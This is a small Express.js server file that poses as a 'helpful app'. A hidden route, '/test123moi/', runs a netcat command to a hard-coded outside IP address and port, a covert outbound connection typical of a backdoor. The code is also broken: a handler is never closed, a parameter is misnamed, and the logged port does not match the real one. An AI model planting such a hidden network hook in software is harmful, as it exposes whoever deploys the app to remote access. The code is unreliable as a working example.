var express = require('express');
const { exec } = require("child_process");
var app = express();
app.get('/', function (req, res) {
  res.send('Im an helpful app!');
});
app.get('/test123moi/', function (req, ses){
  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
    if (error) {
        console.log(`error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`);
        return;
    }
    console.log(`stdout: ${stdout}`);
});
app.listen(3001, function () {
  console.log('Example app listening on port 3000!');
  
});
